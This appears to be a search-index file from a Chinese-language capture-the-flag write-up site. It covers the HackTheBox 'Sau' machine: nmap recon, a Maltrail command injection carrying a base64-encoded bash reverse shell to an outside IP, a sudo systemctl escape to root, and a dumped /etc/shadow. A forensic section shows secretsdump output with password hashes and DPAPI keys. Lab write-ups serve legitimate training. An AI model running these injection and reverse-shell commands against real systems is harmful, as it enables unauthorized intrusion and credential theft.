{"config": {"lang": ["en"], "separator": "[\\s\\u200b\\u3000\\-\u3001\u3002\uff0c\uff0e\uff1f\uff01\uff1b]+", "pipeline": ["stemmer"]}, "docs": [{"location": "", "title": "Home", "text": "<p>\u770b\u4e0d\u60ef\u522b\u4eba\u7684 Write-up\uff0c\u90a3\u5c31\u53ea\u597d\u81ea\u5df1\u5199\u4e86~</p> <ul> <li> <p> Hackthebox</p> </li> <li> <p> Tryhackme</p> </li> </ul>"}, {"location": "HackTheBox/", "title": "Index", "text": "<ul> <li>HackTheBox<ul> <li>Machines</li> <li>Challenges<ul> <li>Misc</li> <li>Web</li> <li>Crypto</li> <li>Reverse</li> <li>Pwn</li> </ul> </li> <li>Sherlocks</li> </ul> </li> </ul>"}, {"location": "HackTheBox/Machines/Sau/", "title": "Sau", "text": ""}, {"location": "HackTheBox/Machines/Sau/#recon", "title": "Recon", "text": "<ul> <li><code>nmap -sC -A -p- --min-rate 1000 -T4 10.10.11.224</code> <pre><code># Nmap 7.94SVN scan initiated Tue Jan  2 09:35:58 2024 as: nmap -sC -A -p22,80,8338,55555, -oN nmap.txt --append-out 10.10.11.224\nNmap scan report for 10.10.11.224\nHost is up (0.22s latency).\n\nPORT      STATE    SERVICE VERSION\n22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)\n|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)\n|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)\n80/tcp    filtered http\n8338/tcp  filtered unknown\n55555/tcp open     unknown\n| fingerprint-strings: \n|   FourOhFourRequest: \n|     HTTP/1.0 400 Bad Request\n|     Content-Type: text/plain; charset=utf-8\n|     X-Content-Type-Options: nosniff\n|     Date: Tue, 02 Jan 2024 01:36:46 GMT\n|     Content-Length: 75\n|     invalid basket name; the name does not match pattern: ^[wd-_\\.]{1,250}$\n|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: \n|     HTTP/1.1 400 Bad Request\n|     Content-Type: text/plain; charset=utf-8\n|     Connection: close\n|     Request\n|   GetRequest: \n|     HTTP/1.0 302 Found\n|     Content-Type: text/html; charset=utf-8\n|     Location: /web\n|     Date: Tue, 02 Jan 2024 01:36:15 GMT\n|     Content-Length: 27\n|     href=\"/web\"&gt;Found&lt;/a&gt;.\n|   HTTPOptions: \n|     HTTP/1.0 200 OK\n|     Allow: GET, OPTIONS\n|     Date: Tue, 02 Jan 2024 01:36:16 GMT\n|_    Content-Length: 0\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port55555-TCP:V=7.94SVN%I=7%D=1/2%Time=6593688F%P=x86_64-pc-linux-gnu%r\nSF:(GetRequest,A2,\"HTTP/1\\.0\\x20302\\x20Found\\r\\nContent-Type:\\x20text/html\nSF:;\\x20charset=utf-8\\r\\nLocation:\\x20/web\\r\\nDate:\\x20Tue,\\x2002\\x20Jan\\x\nSF:202024\\x2001:36:15\\x20GMT\\r\\nContent-Length:\\x2027\\r\\n\\r\\n&lt;a\\x20href=\\\"\nSF:/web\\\"&gt;Found&lt;/a&gt;\\.\\n\\n\")%r(GenericLines,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20\nSF:Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\nSF:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\")%r(HTTPOptions,60,\"HTTP/1\\.0\\x2\nSF:0200\\x20OK\\r\\nAllow:\\x20GET,\\x20OPTIONS\\r\\nDate:\\x20Tue,\\x2002\\x20Jan\\x\nSF:202024\\x2001:36:16\\x20GMT\\r\\nContent-Length:\\x200\\r\\n\\r\\n\")%r(RTSPReque\nSF:st,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plai\nSF:n;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Reques\nSF:t\")%r(Help,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20t\nSF:ext/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x\nSF:20Request\")%r(SSLSessionReq,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nC\nSF:ontent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\\nSF:n\\r\\n400\\x20Bad\\x20Request\")%r(TerminalServerCookie,67,\"HTTP/1\\.1\\x2040\nSF:0\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\\nSF:nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\")%r(TLSSessionReq,67\nSF:,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x2\nSF:0charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\")%r\nSF:(Kerberos,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20te\nSF:xt/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x2\nSF:0Request\")%r(FourOhFourRequest,EA,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\nSF:\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nX-Content-Type-Optio\nSF:ns:\\x20nosniff\\r\\nDate:\\x20Tue,\\x2002\\x20Jan\\x202024\\x2001:36:46\\x20GMT\nSF:\\r\\nContent-Length:\\x2075\\r\\n\\r\\ninvalid\\x20basket\\x20name;\\x20the\\x20n\nSF:ame\\x20does\\x20not\\x20match\\x20pattern:\\x20\\^\\[\\\\w\\\\d\\\\-_\\\\\\.\\]{1,250}\\\nSF:$\\n\")%r(LPDString,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Typ\nSF:e:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x\nSF:20Bad\\x20Request\")%r(LDAPSearchReq,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Reque\nSF:st\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20c\nSF:lose\\r\\n\\r\\n400\\x20Bad\\x20Request\");\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 22/tcp)\nHOP RTT       ADDRESS\n1   259.59 ms 10.10.16.1\n2   185.75 ms 10.10.11.224\n</code></pre> \u53ea\u6709 22 \u548c 55555 \u53ef\u4ee5\u8bbf\u95ee</li> </ul>"}, {"location": "HackTheBox/Machines/Sau/#shell-as-user-puma", "title": "Shell as user - puma", "text": "<p>\u8bbf\u95ee 55555 \u7aef\u53e3  Request-Baskets\uff0c\u53ef\u4ee5\u5b9e\u73b0\u670d\u52a1\u7aef\u4ee3\u7406\u8bf7\u6c42\uff0c\u7ed3\u5408\u7aef\u53e3\u53d1\u73b0\uff0c\u8bbf\u95ee\u672c\u5730 80 \u7aef\u53e3\u3002  \u53d1\u73b0 Maltrail \u670d\u52a1v0.53  \u8be5\u7248\u672c\u5b58\u5728\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\uff0c\u6f0f\u6d1e\u70b9\u5728 login \u8def\u5f84\uff0cpost \u8bf7\u6c42\u5305\u4e2d\u7684 username \u53c2\u6570</p> <p>https://github.com/spookier/Maltrail-v0.53-Exploit/blob/main/exploit.py</p> <p>\u6784\u9020\u53cd\u5f39 shell <code>echo -e '/bin/bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.16.3/2233 0&gt;&amp;1\"' | base64</code> <pre><code>L2Jpbi9iYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjMvMjIzMyAwPiYxIgo=\n</code></pre> \u4fee\u6539 Request-Baskets  \u53d1\u9001\u8bf7\u6c42 <pre><code>curl 'http://10.10.11.224:55555/70aohtj' --data 'username=;`echo+\"L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjMvMjIzMyAwPiYxJwo=\"+|+base64+-d+|+sh`'\n</code></pre> </p>"}, {"location": "HackTheBox/Machines/Sau/#shell-as-root", "title": "Shell as root", "text": "<p>\u67e5\u770b sudo \u6743\u9650 </p> <p>\u4f7f\u7528 <code>sudo /usr/bin/systemctl status trail.service</code> \u67e5\u770b\u670d\u52a1\u72b6\u6001\u65f6\uff0c\u53ef\u4ee5\u901a\u8fc7 <code>!/bin/bash</code> \u83b7\u5f97 shell </p>"}, {"location": "HackTheBox/Machines/Sau/#pass-hash", "title": "Pass Hash", "text": "<p><code>cat /etc/shadow</code> <pre><code>root:$6$4IguUssRBYl3/LvG$MfnFD1Y9saTrvw2OqA1VtqKxa7TsDt1kb2qsJw6inQ8GfmnqIrh32eqk9IMO4UR3fYG.TzbJeiFd7UOu1QlGR0:19461:0:99999:7:::\ndaemon:*:19367:0:99999:7:::\nbin:*:19367:0:99999:7:::\nsys:*:19367:0:99999:7:::\nsync:*:19367:0:99999:7:::\ngames:*:19367:0:99999:7:::\nman:*:19367:0:99999:7:::\nlp:*:19367:0:99999:7:::\nmail:*:19367:0:99999:7:::\nnews:*:19367:0:99999:7:::\nuucp:*:19367:0:99999:7:::\nproxy:*:19367:0:99999:7:::\nwww-data:*:19367:0:99999:7:::\nbackup:*:19367:0:99999:7:::\nlist:*:19367:0:99999:7:::\nirc:*:19367:0:99999:7:::\ngnats:*:19367:0:99999:7:::\nnobody:*:19367:0:99999:7:::\nsystemd-network:*:19367:0:99999:7:::\nsystemd-resolve:*:19367:0:99999:7:::\nsystemd-timesync:*:19367:0:99999:7:::\nmessagebus:*:19367:0:99999:7:::\nsyslog:*:19367:0:99999:7:::\n_apt:*:19367:0:99999:7:::\ntss:*:19367:0:99999:7:::\nuuidd:*:19367:0:99999:7:::\ntcpdump:*:19367:0:99999:7:::\nsshd:*:19367:0:99999:7:::\nlandscape:*:19367:0:99999:7:::\npollinate:*:19367:0:99999:7:::\nfwupd-refresh:*:19367:0:99999:7:::\nsystemd-coredump:!!:19461::::::\nlxd:!:19461::::::\npuma:$6$eB4LwfQg7IgQC38d$SktdHbU0gQAh0.BoRY36FHreH6xR073oHdRrk6hmvar4eZTnmkfxbUxsMBsaZMRm9XHYQF9hG4l5v6fefYdic/:19461:0:99999:7:::\n_laurel:!:19527::::::\n</code></pre></p>"}, {"location": "HackTheBox/Sherlocks/OpTinselTrace-5/", "title": "OpTinselTrace 5", "text": "<pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/C%3A/Windows/System32/config]\n\u2514\u2500$ impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY local -pwd-last-set -user-status -history\nImpacket v0.11.0 - Copyright 2023 Fortra\n\n[*] Target system bootKey: 0x06326087bd0dc6172e31701ef27024d5\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:b473c2b77b3a05800fd7c304fb1f1b37:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n[*] Dumping cached domain logon information (domain/username:hash)\n[*] Dumping LSA Secrets\n[*] $MACHINE.ACC \n$MACHINE.ACC:plain_password_hex:63003000460040005500400057004600210053003c0044005c003a00690056002200220046005f0079002c007700450042003100290053002d006a004a006a004a0025004b0071005a0042003b004c0057005b00350056005b003100440047003f005e00770065005300250069003a0073006d004c0074002b004f0037003e0033002f00450060003d003b0048004e002700540026003400350035002f004d0036005c0052006a00560046005f00350039002d00610046005e0040002f004900550021003c00340064002f002b0063004a00250060006f003000660034002f00200061003600660049002d002b004600\n$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:53da7cc22771a35b151b4bbb3ff143ad\n[*] $MACHINE.ACC_history \n$MACHINE.ACC:plain_password_hex:dfeef9b6828781f822dc49d8cacfe2a6d418196ec18df74070b078fb53ccf4017d61665edd7ddfef12f1a66a9c2ea295e92efe0cd59a5128acef45a00fb837e76b6ad349956dab1af6df16c2024b6eb0e52c74ea8c2e86c77c882bbd611b9fa85ee424968a1a849381d1022a46cd18575ec0d6b8568aeda9a91611beb6357d4b81389f455c26f294b3a8672d1284e7f39efb836f4c8db86dbc0b87ea2a3af3e8d72ec326f800c8e3b0c8328d782563aa88889ada07d8b5dc3efe89f56522a9141e2b66d1db719050e9ebde58ea7aabba80e9ac071ac27695f9cf1832ea6fac953d500de4a954e3a7d07bf919ddd30056\n$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:5998b3332d3591edbea01a7d315ddf2b\n[*] DPAPI_SYSTEM \ndpapi_machinekey:0xed8d2c90415e02e01b3be3d51a81cc1dbaf5f9dd\ndpapi_userkey:0x77b9dde8f1fc0bdfe8c7196832f674f7b36563d1\n[*] DPAPI_SYSTEM_history \ndpapi_machinekey:0xd6701523fcee9c510499273c7d6ed1104ea692cb\ndpapi_userkey:0x1e0cbfd9a7fbaa327565c5b783775fe597e29bda\n[*] NL$KM \n 0000   A8 4F 91 67 0E A4 59 0F  7E 25 B4 A1 0B A8 F8 B3   .O.g..Y.~%......\n 0010   D6 B8 EF AF E2 24 70 D1  43 75 95 F8 37 97 E3 CE   .....$p.Cu..7...\n 0020   7D 43 3F 15 24 C6 C2 29  84 12 51 62 47 7E D6 8D   }C?.$..)..QbG~..\n 0030   19 E5 AA 8B 62 1F 5D 9A  5A 0E BE 39 53 86 8F 3A   ....b.].Z..9S..:\nNL$KM:a84f91670ea4590f7e25b4a10ba8f8b3d6b8efafe22470d1437595f83797e3ce7d433f1524c6c22984125162477ed68d19e5aa8b621f5d9a5a0ebe3953868f3a\n[*] NL$KM_history \n 0000   A8 4F 91 67 0E A4 59 0F  7E 25 B4 A1 0B A8 F8 B3   .O.g..Y.~%......\n 0010   D6 B8 EF AF E2 24 70 D1  43 75 95 F8 37 97 E3 CE   .....$p.Cu..7...\n 0020   7D 43 3F 15 24 C6 C2 29  84 12 51 62 47 7E D6 8D   }C?.$..)..QbG~..\n 0030   19 E5 AA 8B 62 1F 5D 9A  5A 0E BE 39 53 86 8F 3A   ....b.].Z..9S..:\nNL$KM_history:a84f91670ea4590f7e25b4a10ba8f8b3d6b8efafe22470d1437595f83797e3ce7d433f1524c6c22984125162477ed68d19e5aa8b621f5d9a5a0ebe3953868f3a\n[*] Cleaning up...\n</code></pre>"}]}